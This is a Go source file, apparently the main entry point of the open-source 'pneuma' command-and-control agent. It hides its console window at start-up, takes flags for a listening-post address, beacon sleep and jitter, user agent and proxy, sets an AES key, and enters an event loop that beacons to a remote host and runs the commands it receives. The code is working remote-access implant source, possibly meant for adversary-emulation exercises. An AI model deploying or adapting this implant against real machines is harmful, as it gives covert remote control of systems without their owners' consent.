package main

import (
	"flag"
	"os"
	"strings"

	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
)

var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"

func init() {
	util.HideConsole()
}

func main() {
	agent := util.BuildAgentConfig()
	name := flag.String("name", agent.Name, "Give this agent a name")
	contact := flag.String("contact", agent.Contact, "Which contact to use")
	address := flag.String("address", agent.Address, "The ip:port of the socket listening post")
	group := flag.String("range", agent.Range, "Which range to associate to")
	sleep := flag.Int("sleep", agent.Sleep, "Number of seconds to sleep between beacons")
	jitter := flag.Int("jitter", agent.CommandJitter, "Number of seconds to sleep between instructions")
	timeout := flag.Int("timeout", agent.CommandTimeout, "Number of seconds to wait until a command execution times out")
	useragent := flag.String("useragent", agent.Useragent, "User agent used when connecting (HTTP/S only)")
	proxy := flag.String("proxy", agent.Proxy, "Set a proxy URL target (HTTP/S only)")
	util.DebugMode = flag.Bool("debug", agent.Debug, "Write debug output to console")
	if flag.ErrHelp != nil {
		flag.PrintDefaults()
		util.ShowConsole()
		os.Exit(1)
	}
	agent.SetAgentConfig(map[string]interface{}{
		"Name":           *name,
		"Contact":        *contact,
		"Address":        *address,
		"Range":          *group,
		"Useragent":      *useragent,
		"Sleep":          *sleep,
		"Proxy":          *proxy,
		"CommandJitter":  *jitter,
		"CommandTimeout": *timeout,
	})
	if *util.DebugMode {
		util.ShowConsole()
	}
	if !strings.Contains(agent.Address, ":") {
		util.DebugLogf("Your address is incorrect\n")
		os.Exit(1)
	}
	util.EncryptionKey = &agent.AESKey
	sockets.UA = &agent.Useragent
	util.DebugLogf("[%s] agent at PID %d using hash randomizing string %s", agent.Address, agent.Pid, randomHash)
	sockets.EventLoop(agent, agent.BuildBeacon())
}
